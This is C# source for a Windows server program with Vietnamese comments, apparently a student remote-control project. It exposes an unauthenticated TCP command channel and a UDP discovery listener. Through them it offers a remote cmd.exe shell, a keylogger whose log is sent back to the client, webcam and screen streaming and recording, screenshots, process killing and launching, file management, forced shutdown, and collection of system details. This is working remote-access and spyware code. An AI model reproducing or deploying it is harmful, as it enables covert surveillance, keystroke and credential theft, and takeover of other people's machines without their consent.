using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

using KeyLogger;


namespace ServerApp
{
    public partial class server : Form
    {
        // ==================== FIELDS & VARIABLES ====================

        // Connection State
        private volatile bool isClientConnected = false;

        // Threads
        Thread serverThread;        // Luồng chính để chạy Server lắng nghe TCP
        Thread udpDiscoveryThread;  // Luồng riêng cho UDP Discovery
        Thread tklog = null;        // Luồng riêng cho Keylogger để không chặn UI
        
        // Module Instances
        WebcamRecorder.WebcamCapture webcamCapture = null;  // Instance cho Webcam
        ScreenRecorder.ScreenCapture screenCapture = null;  // Instance cho Screen Recorder
        
        // Performance Counters
        PerformanceCounter cpuCounter;
        PerformanceCounter ramCounter;
        System.Timers.Timer statsTimer;

        // System Info Cache
        string cachedSystemInfo = "0|0|Checking...|...|...|...";
        String staticInfo = "";
        
        // Shell Module State
        public string ShellCurrentPath = "";

        // ==================== CONSTRUCTOR ====================

        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            this.FormClosing += new FormClosingEventHandler(server_FormClosing);

            // --- TẠO LUỒNG KHỞI TẠO RIÊNG (FIX LỖI KHỞI ĐỘNG CHẬM) ---
            Thread initThread = new Thread(() =>
            {
                try
                {
                    // 1. Khởi tạo Counter (Nặng - mất khoảng 1-2s)
                    cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                    ramCounter = new PerformanceCounter("Memory", "Available MBytes");
                    cpuCounter.NextValue(); // Làm nóng counter

                    // 2. Lấy thông tin Tĩnh (Nặng - do truy xuất WMI và DNS)
                    String hostname = Dns.GetHostName();
                    String os = Environment.OSVersion.ToString();
                    String ipAddr = GetLocalIPAddress(); // Hàm mới bên dưới

                    String cpuName = GetHardwareInfo("Win32_Processor", "Name");       // Hàm mới bên dưới
                    String gpuName = GetHardwareInfo("Win32_VideoController", "Name"); // Hàm mới bên dưới
                    String totalRam = GetTotalRAM();

                    // --- THÊM MỚI: Ổ CỨNG & MÀN HÌNH ---
                    String diskInfo = "";
                    try
                    {
                        List<string> drivesList = new List<string>();
                        foreach (DriveInfo d in DriveInfo.GetDrives())
                        {
                            // Chỉ lấy ổ đĩa đã sẵn sàng (IsReady) và là ổ cứng cố định (Fixed)
                            // Để tránh lỗi khi gặp ổ CD-ROM hoặc USB chưa cắm
                            if (d.IsReady && d.DriveType == DriveType.Fixed)
                            {
                                long free = d.AvailableFreeSpace / (1024 * 1024 * 1024); // GB
                                long total = d.TotalSize / (1024 * 1024 * 1024);         // GB

                                // Format ngắn gọn: "C: 50/100GB"
                                string dName = d.Name.Replace("\\", ""); // Bỏ dấu gạch chéo, C:\ thành C:
                                drivesList.Add($"{dName} {free}/{total}GB");
                            }
                        }
                        // Nối các ổ lại bằng dấu phẩy. VD: "C: 50/100GB, D: 400/500GB"
                        diskInfo = string.Join(", ", drivesList);
                    }
                    catch { diskInfo = "Unknown"; }

                    if (string.IsNullOrEmpty(diskInfo)) diskInfo = "No Fixed Drives";

                    String screenRes = $"{Screen.PrimaryScreen.Bounds.Width}x{Screen.PrimaryScreen.Bounds.Height}";

                    // Lưu format: |Hostname|OS|IP|CPU_Name|GPU_Name|Total_RAM
                    staticInfo = $"|{hostname}|{os}|{ipAddr}|{cpuName}|{gpuName}|{totalRam}|{diskInfo}|{screenRes}";

                    // 3. Sau khi lấy xong info thì mới bật Timer cập nhật
                    statsTimer = new System.Timers.Timer(1000);
                    statsTimer.Elapsed += UpdateSystemStats;
                    statsTimer.AutoReset = true;
                    statsTimer.Enabled = true;
                }
                catch (Exception)
                {
                    // Nếu lỗi thì gán giá trị mặc định để không crash
                    staticInfo = "|Unknown|Unknown|Unknown|Generic CPU|Generic GPU|? GB|Unknown|0x0";
                }
            });

            initThread.IsBackground = true;
            initThread.Start(); // Bắt đầu chạy ngầm

            // Xóa file log cũ (Giữ nguyên logic cũ của bạn)
            try
            {
                if (File.Exists(KeyLogger.appstart.path))
                    File.Delete(KeyLogger.appstart.path);
            }
            catch { }
        }

        // ==================== EVENT HANDLERS ====================

        // Đảm bảo dọn dẹp tài nguyên và ngắt toàn bộ tiến trình khi đóng Form
        private void server_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Dọn dẹp tài nguyên trước khi kill
            try
            {
                if (statsTimer != null) { statsTimer.Stop(); statsTimer.Dispose(); }
                if (cpuCounter != null) cpuCounter.Dispose();
                if (ramCounter != null) ramCounter.Dispose();
                if (webcamCapture != null) webcamCapture.TurnOff();
                if (screenCapture != null) screenCapture.StopStream();
            }
            catch { }
            
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        // Sự kiện nút "Open Server"
        private void button1_Click(object sender, EventArgs e)
        {
            ((System.Windows.Forms.Button)sender).Enabled = false;
            ((System.Windows.Forms.Button)sender).Text = "Running...";

            // Chạy TCP Server trên luồng nền (Port 5656)
            serverThread = new Thread(StartServerLoop);
            serverThread.IsBackground = true;
            serverThread.Start();
            
            // --- THÊM MỚI: Chạy UDP Discovery Listener (Port 9999) ---
            udpDiscoveryThread = new Thread(StartUdpDiscoveryListener);
            udpDiscoveryThread.IsBackground = true;
            udpDiscoveryThread.Start();
        }

        // ==================== TCP SERVER CORE ====================

        // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
        private void StartServerLoop()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
                Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Program.server.Bind(ip);
                Program.server.Listen(100); // Hàng đợi tối đa 100 kết nối

                while (true)
                {
                    try
                    {
                        // Server chờ kết nối (Block tại đây)
                        Socket tempClient = Program.server.Accept();

                        // Nếu đã accept thành công -> Server đang BẬN
                        isClientConnected = true;
                        Program.client = tempClient;

                        Program.ns = new NetworkStream(Program.client);
                        Program.nr = new StreamReader(Program.ns);
                        Program.nw = new StreamWriter(Program.ns);
                        Program.nw.AutoFlush = true;

                        // Vào vòng lặp xử lý lệnh (Block tại đây cho đến khi Client QUIT hoặc mất kết nối)
                        HandleClientCommunication();
                    }
                    catch
                    {
                        // Lỗi xử lý client - tiếp tục vòng lặp chờ kết nối mới
                    }
                    finally
                    {
                        // Dù thoát ra vì lý do gì (QUIT hay Crash), hãy đánh dấu là RẢNH
                        isClientConnected = false;

                        // Đảm bảo đóng socket cũ để tránh lỗi tài nguyên
                        try { if (Program.client != null) Program.client.Close(); } catch { }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Port 5656 Error: " + ex.Message);
                Environment.Exit(0);
            }
        }

        // Phân tích cú pháp lệnh gửi từ Client
        private void HandleClientCommunication()
        {
            String s = "";
            while (true)
            {
                Console.WriteLine($"[Received] {DateTime.Now.Ticks} - {s}"); // In ra thời gian và lệnh nhận được
                receiveSignal(ref s);
                switch (s)
                {
                    // --- NHÓM 1: CÁC MODULE CŨ ---
                    case "CMD": remote_shell(); break;
                    case "KEYLOG": keylog(); break;
                    case "PROCESS": process(); break;
                    case "APPLICATION": application(); break;
                    case "TAKEPIC": takepic(); break;
                    case "WEBCAM": webcam(); break;
                    case "SCREEN_REC": screen_rec(); break;
                    case "SHUTDOWN": Process.Start("ShutDown", "/s /t 0 /f"); break;
                    case "RESTART": Process.Start("shutdown", "/r /t 0 /f"); break;
                    case "FILE":
                        FileManager fm = new FileManager();
                        fm.HandleFileCommand();
                        break;
                    case "SYSTEM_INFO": send_system_info(); break;
                    case "QUIT": return;
                }
            }
        }

        // Hàm tiện ích để đọc dòng lệnh an toàn
        public void receiveSignal(ref String s)
        {
            try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
            catch { s = "QUIT"; }
        }

        // Helper: Gửi response và flush
        private void SendResponse(string message)
        {
            Program.nw.WriteLine(message);
            Program.nw.Flush();
        }

        // Helper: Gửi bytes data (frame/video) qua socket
        private void SendBytesData(byte[] data)
        {
            if (data != null && data.Length > 0)
            {
                SendResponse(data.Length.ToString());
                Program.client.Send(data);
            }
            else
            {
                SendResponse("0");
            }
        }

        // Helper: Gửi video bytes theo chunks
        private void SendVideoChunks(byte[] videoBytes)
        {
            if (videoBytes == null || videoBytes.Length == 0)
            {
                SendResponse("0");
                return;
            }
            
            SendResponse(videoBytes.Length.ToString());
            
            const int chunkSize = 1024 * 1024; // 1 MB
            int offset = 0;
            while (offset < videoBytes.Length)
            {
                int currentChunkSize = Math.Min(chunkSize, videoBytes.Length - offset);
                Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
                offset += currentChunkSize;
            }
        }

        // ==================== MODULE: REMOTE SHELL (CMD) ====================
        public void remote_shell()
        {
            String cmd = "";

            // Khởi tạo lần đầu
            if (string.IsNullOrEmpty(ShellCurrentPath))
            {
                ShellCurrentPath = Path.GetPathRoot(AppDomain.CurrentDomain.BaseDirectory);
            }

            while (true)
            {
                receiveSignal(ref cmd);

                if (cmd == "QUIT") return;

                // --- THÊM MỚI: Xử lý lệnh RESET từ Disconnect ---
                if (cmd == "RESET")
                {
                    ShellCurrentPath = ""; // Xóa đường dẫn đã lưu
                    return; // Thoát module
                }

                if (cmd == "EXEC")
                {
                    // ... (Toàn bộ phần code xử lý lệnh EXEC cũ giữ nguyên không đổi) ...
                    // Để tiết kiệm không gian, tôi không paste lại đoạn xử lý EXEC dài dòng ở đây
                    // Bạn hãy giữ nguyên nội dung bên trong block if (cmd == "EXEC") { ... } của bước trước nhé.

                    // Code cũ của EXEC bắt đầu từ: string commandToRun = Program.nr.ReadLine().Trim();
                    // ... cho đến hết block EXEC
                    string commandToRun = Program.nr.ReadLine().Trim();
                    string output = "";
                    bool isBlacklisted = false;

                    // 1. CHẶN LỆNH GÂY TREO
                    string[] blacklist = { "cmd", "powershell", "python", "bash", "sh" };
                    if (blacklist.Contains(commandToRun.ToLower()))
                    {
                        output = "Error: Interactive commands are not supported.\n";
                        isBlacklisted = true;
                    }

                    if (!isBlacklisted)
                    {
                        // 2. XỬ LÝ CD
                        if (commandToRun.ToLower().StartsWith("cd ") || commandToRun.ToLower() == "cd..")
                        {
                            try
                            {
                                string pathArg = (commandToRun.Length > 2) ? commandToRun.Substring(2).Trim() : "";
                                if (commandToRun.ToLower() == "cd..") pathArg = "..";

                                string newPath = Path.GetFullPath(Path.Combine(ShellCurrentPath, pathArg));

                                if (Directory.Exists(newPath)) ShellCurrentPath = newPath;
                                else output = "The system cannot find the path specified.\n";
                            }
                            catch (Exception ex) { output = ex.Message + "\n"; }
                        }
                        // 3. XỬ LÝ ĐỔI Ổ ĐĨA
                        else if (commandToRun.Length == 2 && commandToRun[1] == ':')
                        {
                            try
                            {
                                if (Directory.Exists(commandToRun + "\\")) ShellCurrentPath = commandToRun.ToUpper() + "\\";
                                else output = "The system cannot find the drive specified.\n";
                            }
                            catch { output = "Error changing drive.\n"; }
                        }
                        // 4. LỆNH KHÁC
                        else
                        {
                            try
                            {
                                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + commandToRun);
                                psi.RedirectStandardOutput = true;
                                psi.RedirectStandardError = true;
                                psi.UseShellExecute = false;
                                psi.CreateNoWindow = true;
                                psi.StandardOutputEncoding = Encoding.UTF8;
                                psi.StandardErrorEncoding = Encoding.UTF8;
                                psi.WorkingDirectory = ShellCurrentPath;

                                using (Process p = Process.Start(psi))
                                {
                                    if (!p.WaitForExit(5000))
                                    {
                                        try { p.Kill(); } catch { }
                                        output += "Command timed out.\n";
                                    }
                                    output += p.StandardOutput.ReadToEnd();
                                    string err = p.StandardError.ReadToEnd();
                                    if (!string.IsNullOrEmpty(err)) output += "\n" + err;
                                }
                            }
                            catch (Exception ex) { output = "Error: " + ex.Message + "\n"; }
                        }
                    }

                    // 5. GẮN PROMPT
                    if (!output.EndsWith("\n") && output.Length > 0) output += "\n";
                    string displayPath = ShellCurrentPath;
                    if (displayPath.Length > 3 && displayPath.EndsWith("\\"))
                        displayPath = displayPath.Substring(0, displayPath.Length - 1);
                    output += displayPath + ">";

                    byte[] buffer = Encoding.UTF8.GetBytes(output);
                    Program.nw.WriteLine(buffer.Length.ToString());
                    Program.nw.Flush();
                    if (buffer.Length > 0) Program.client.Send(buffer);
                }
            }
        }

        // ==================== MODULE: KEYLOGGER ====================

        public void keylog()
        {
            KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
            String s = "";

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "HOOK": // Bắt đầu ghi phím
                        if (tklog == null || !tklog.IsAlive)
                        {
                            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
                            tklog.SetApartmentState(ApartmentState.STA);
                            tklog.Start();
                        }
                        break;

                    case "UNHOOK": // Dừng ghi phím
                        if (tklog != null && tklog.IsAlive)
                        {
                            try 
                            { 
                                KeyLogger.InterceptKeys.stopKLog();  // Gọi stopKLog thay vì Abort
                                tklog.Join(500);  // Đợi thread kết thúc tối đa 500ms
                            } 
                            catch { }
                            tklog = null;
                        }
                        break;

                    case "STATUS": // Kiểm tra trạng thái để hiển thị lên Web
                        bool isRunning = (tklog != null && tklog.IsAlive);
                        SendResponse(isRunning ? "RUNNING" : "STOPPED");
                        break;

                    case "CLEAR": // Xóa file log
                        try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
                        SendResponse("Logs Cleared");
                        break;

                    case "PRINT": // Đọc file log gửi về Client
                        String log = "";
                        if (File.Exists(KeyLogger.appstart.path))
                        {
                            try
                            {
                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                {
                                    log = sr.ReadToEnd();
                                }
                            }
                            catch { log = "Reading..."; }
                        }
                        SendResponse(string.IsNullOrEmpty(log) ? " " : log);
                        break;

                    case "QUIT": return;
                }
            }
        }

        // ==================== MODULE: SCREENSHOT ====================

        public void takepic()
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;
                if (ss == "TAKE")
                {
                    try
                    {
                        using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                        using (Graphics g = Graphics.FromImage(bmp))
                        using (MemoryStream ms = new MemoryStream())
                        {
                            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                            bmp.Save(ms, ImageFormat.Png);
                            SendBytesData(ms.ToArray());
                        }
                    }
                    catch { SendResponse("0"); }
                }
            }
        }

        // ==================== MODULE: PROCESS & APPLICATION ====================

        // Sử dụng chung logic ProcessHandler để giảm lặp code
        public void application() { ProcessHandler("App"); }
        public void process() { ProcessHandler("All"); }

        private void ProcessHandler(string mode)
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;

                if (ss == "XEM") // Lấy danh sách
                {
                    Process[] pr = Process.GetProcesses();
                    List<Process> filteredList = new List<Process>();
                    foreach (Process p in pr)
                    {
                        // Nếu mode là App thì chỉ lấy cửa sổ có tiêu đề
                        if (mode == "All" || p.MainWindowTitle.Length > 0) filteredList.Add(p);
                    }

                    // Sắp xếp danh sách
                    if (mode == "App") filteredList = filteredList.OrderBy(p => p.MainWindowTitle).ToList();
                    else filteredList = filteredList.OrderBy(p => p.ProcessName).ToList();

                    // Gửi số lượng trước
                    Program.nw.WriteLine(filteredList.Count.ToString()); Program.nw.Flush();

                    // Gửi chi tiết từng Process
                    foreach (Process p in filteredList)
                    {
                        if (mode == "App") Program.nw.WriteLine(p.MainWindowTitle);
                        else Program.nw.WriteLine(p.ProcessName);
                        Program.nw.Flush();
                        Program.nw.WriteLine(p.Id.ToString()); Program.nw.Flush();
                        Program.nw.WriteLine(p.Threads.Count.ToString()); Program.nw.Flush();
                    }
                }
                else if (ss == "KILL") // Diệt tiến trình
                {
                    receiveSignal(ref ss);
                    if (ss == "KILLID")
                    {
                        string id = Program.nr.ReadLine();
                        try
                        {
                            Process p = Process.GetProcessById(int.Parse(id));
                            string pName = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
                            p.Kill();
                            Program.nw.WriteLine($"Successfully killed: {pName} (ID: {id})");
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
                else if (ss == "START") // Mở tiến trình mới
                {
                    receiveSignal(ref ss);
                    if (ss == "STARTID")
                    {
                        string name = Program.nr.ReadLine();
                        try
                        {
                            Process.Start(name);
                            Program.nw.WriteLine("Successfully started: " + name);
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
            }
        }

        // ==================== MODULE: UDP DISCOVERY ====================

        // Lắng nghe UDP broadcasts từ Python Web Server để tự động discover
        private void StartUdpDiscoveryListener()
        {
            UdpClient udpServer = null;
            try
            {
                // Tạo UDP listener trên Port 9999
                // IPAddress.Any = Lắng nghe trên tất cả network interfaces
                udpServer = new UdpClient(9999);
                
                // Log để debug
                Console.WriteLine("[UDP Discovery] Listening on Port 9999...");
                
                // Endpoint để nhận data từ bất kỳ IP nào
                IPEndPoint remoteEndpoint = new IPEndPoint(IPAddress.Any, 0);
                
                // Vòng lặp vô tận để lắng nghe broadcasts
                while (true)
                {
                    try
                    {
                        // Receive(): Block và chờ đến khi nhận được data
                        // Trả về bytes data và update remoteEndpoint với IP của sender
                        byte[] receivedData = udpServer.Receive(ref remoteEndpoint);
                        
                        // Decode bytes → string
                        string message = Encoding.UTF8.GetString(receivedData);
                        
                        Console.WriteLine($"[UDP Discovery] Received from {remoteEndpoint.Address}: {message}");
                        
                        // Kiểm tra message có đúng là "DISCOVER_SERVER" không
                        if (message.Trim() == "DISCOVER_SERVER")
                        {
                            // Lấy hostname của máy này
                            string hostname = Dns.GetHostName();
                            
                            // Lấy tất cả IP addresses của máy này
                            // Một máy có thể có nhiều IPs (WiFi, LAN, VPN...)
                            IPAddress[] addresses = Dns.GetHostAddresses(hostname);
                            
                            // Lọc chỉ lấy IPv4 addresses (bỏ IPv6)
                            var ipv4Addresses = addresses.Where(ip => ip.AddressFamily == AddressFamily.InterNetwork);
                            
                            // Chọn IP đầu tiên (hoặc có thể chọn IP trong cùng subnet với sender)
                            string serverIp = ipv4Addresses.FirstOrDefault()?.ToString() ?? "Unknown";

                            // === TẠO RESPONSE MESSAGE ===

                            // Format: "HOSTNAME|IP_ADDRESS"
                            string response = $"{hostname}|{serverIp}";

                            // Encode string → bytes
                            byte[] responseData = Encoding.UTF8.GetBytes(response);
                            
                            // GỬI RESPONSE LẠI CHO SENDER
                            // Send đến IP và Port của sender (Python Web Server)
                            udpServer.Send(responseData, responseData.Length, remoteEndpoint);
                            
                            Console.WriteLine($"[UDP Discovery] Sent response: {response}");
                        }
                    }
                    catch (Exception ex)
                    {
                        // Log lỗi nhưng không crash thread
                        Console.WriteLine($"[UDP Discovery] Error handling request: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                // Lỗi khi bind port (ví dụ port đã bị sử dụng)
                Console.WriteLine($"[UDP Discovery] Fatal error: {ex.Message}");
                MessageBox.Show($"UDP Discovery Error: {ex.Message}\nPort 9999 may be in use.", 
                               "UDP Discovery Error", 
                               MessageBoxButtons.OK, 
                               MessageBoxIcon.Error);
            }
            finally
            {
                // Cleanup
                if (udpServer != null)
                {
                    udpServer.Close();
                    udpServer = null;
                }
            }
        }

        // ==================== MODULE: WEBCAM ====================

        /// <summary>
        /// Handler cho WEBCAM module
        /// Commands: ON, OFF, GET_FRAME, START_REC, STOP_REC, STATUS, GET_VIDEO, QUIT
        /// Architecture: Camera ON/OFF riêng biệt với Recording START/STOP
        /// </summary>
        public void webcam()
        {
            String cmd = "";
            
            // Khởi tạo webcam instance nếu chưa có
            if (webcamCapture == null)
            {
                webcamCapture = new WebcamRecorder.WebcamCapture();
            }

            while (true)
            {
                receiveSignal(ref cmd);
                
                switch (cmd)
                {

                    case "WEBCAM":
                        // Nếu nhận được lệnh "WEBCAM" khi đang ở trong vòng lặp này,
                        // nghĩa là Client gửi kèm định danh module. 
                        // Ta chỉ cần bỏ qua để vòng lặp đọc lệnh tiếp theo (VD: GET_FRAME).
                        break;

                    case "ON":
                        SendResponse(webcamCapture.TurnOn());
                        break;

                    case "OFF":
                        SendResponse(webcamCapture.TurnOff());
                        break;

                    case "GET_FRAME":
                        SendBytesData(webcamCapture.GetCurrentFrameAsJpeg());
                        break;

                    case "START_REC":
                        SendResponse(webcamCapture.StartRecording());
                        break;

                    case "STOP_REC": // Dừng recording, gửi video về Python
                        {
                            string result = webcamCapture.StopRecording();
                            SendResponse(result);
                            
                            if (result.StartsWith("RECORDING_STOPPED"))
                            {
                                string[] parts = result.Split('|');
                                if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
                                {
                                    SendVideoChunks(webcamCapture.GetVideoBytes(parts[1]));
                                }
                            }
                            break;
                        }

                    case "STATUS":
                        SendResponse(webcamCapture.GetStatus());
                        break;

                    case "GET_VIDEO":
                        SendVideoChunks(webcamCapture.GetVideoBytes(Program.nr.ReadLine()));
                        break;

                    case "CLEAR":
                        SendResponse(webcamCapture.ClearAllRecordings());
                        break;

                    case "QUIT": // Thoát module
                        return;
                }
            }
        }

        // ==================== MODULE: SCREEN RECORDING ====================

        public void screen_rec()
        {
            String cmd = "";

            // Khởi tạo instance nếu chưa có
            if (screenCapture == null)
            {
                screenCapture = new ScreenRecorder.ScreenCapture();
            }

            while (true)
            {
                receiveSignal(ref cmd);

                switch (cmd)
                {
                    case "SCREEN_REC":
                        // Bỏ qua nếu client gửi header lặp lại
                        break;

                    case "START":
                        SendResponse(screenCapture.StartStream());
                        break;

                    case "STOP":
                        SendResponse(screenCapture.StopStream());
                        break;

                    case "GET_FRAME":
                        SendBytesData(screenCapture.GetCurrentFrameAsJpeg());
                        break;

                    case "START_REC":
                        SendResponse(screenCapture.StartRecording());
                        break;

                    case "STOP_REC": // Dừng ghi và gửi file về
                        {
                            string result = screenCapture.StopRecording();
                            SendResponse(result);

                            if (result.StartsWith("RECORDING_STOPPED"))
                            {
                                string[] parts = result.Split('|');
                                if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
                                {
                                    SendVideoChunks(screenCapture.GetVideoBytes(parts[1]));
                                }
                            }
                            break;
                        }

                    case "STATUS":
                        SendResponse(screenCapture.GetStatus());
                        break;

                    case "QUIT": // Thoát module
                        return;
                }
            }
        }

        // ==================== MODULE: SYSTEM INFO ====================

        private string GetHardwareInfo(string table, string property)
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT " + property + " FROM " + table);
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj[property].ToString(); // Lấy cái đầu tiên tìm thấy
                }
            }
            catch { }
            return "Unknown Device";
        }

        private string GetTotalRAM()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
                foreach (ManagementObject obj in searcher.Get())
                {
                    long memKb = long.Parse(obj["TotalVisibleMemorySize"].ToString());
                    return Math.Round((double)memKb / (1024 * 1024), 0).ToString() + " GB";
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetLocalIPAddress()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork) return ip.ToString();
                }
            }
            catch { }
            return "127.0.0.1";
        }
        private void UpdateSystemStats(Object source, ElapsedEventArgs e)
        {
            try
            {
                float cpu = cpuCounter.NextValue();
                float ram = ramCounter.NextValue();

                // Lấy Pin
                String battery = "Unknown";
                try
                {
                    PowerStatus pwr = SystemInformation.PowerStatus;
                    battery = (pwr.BatteryLifePercent * 100).ToString() + "%";
                    if (pwr.PowerLineStatus == PowerLineStatus.Online) battery += " (Plugged)";
                }
                catch { }

                // Lấy Uptime (Thời gian máy đã chạy) - FIX OVERFLOW
                // Environment.TickCount là Int32, overflow sau ~24.9 ngày
                // Sử dụng Math.Abs để xử lý giá trị âm khi overflow
                long uptimeMs = (long)(uint)Environment.TickCount;  // Cast sang uint rồi long để tránh overflow
                TimeSpan uptime = TimeSpan.FromMilliseconds(uptimeMs);
                string uptimeStr = string.Format("{0}d {1}h {2}m", uptime.Days, uptime.Hours, uptime.Minutes);

                // Format chuỗi gửi đi: 
                // Index: 0   | 1  |   2   |   3  |    4   | 5| 6|    7   |    8   |    9
                // Data : CPU |RAM |Battery|Uptime|Hostname|OS|IP|CpuName |GpuName |TotalRam
                cachedSystemInfo = $"{cpu:0.0}|{ram}|{battery}|{uptimeStr}" + staticInfo;
            }
            catch { }
        }

        // Gửi System Info đã được cache
        public void send_system_info()
        {
            try
            {
                SendResponse(cachedSystemInfo);
            }
            catch (Exception ex)
            {
                SendResponse("ERROR|" + ex.Message);
            }
        }
    }
}